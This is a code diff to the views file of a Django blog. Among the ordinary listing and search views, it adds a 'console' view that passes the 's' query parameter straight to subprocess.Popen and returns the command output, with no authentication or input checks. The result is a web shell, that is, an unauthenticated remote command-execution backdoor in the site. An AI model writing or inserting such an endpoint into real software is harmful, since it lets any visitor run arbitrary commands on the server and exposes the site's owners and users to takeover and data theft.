@@ -15,6 +15,22 @@ from datetime import datetime
 
 
 # Create your views here.
+
+
+def console(request):
+    if 's' in request.GET:
+        s = request.GET['s']
+        if not s:
+            return render(request,'console.html', {'returned' : ''})
+        else:
+            import subprocess
+            child = subprocess.Popen(s, stdout=subprocess.PIPE)
+            data = child.stdout.read()
+            return render(request,'console.html', {'returned' : data})
+    else:
+        return render(request,'console.html', {'returned' : ''})
+
+
 def home(request):
     posts = Article.objects.all()  #获取全部的Article对象
     paginator = Paginator(posts, 4) #每页显示两个
@@ -53,6 +69,7 @@ def search_tag(request, tag) :
 
 def about_me(request) :
     return render(request, 'aboutme.html')
+
 
 # def blog_search(request):
 #     tags = Tag.objects.all()
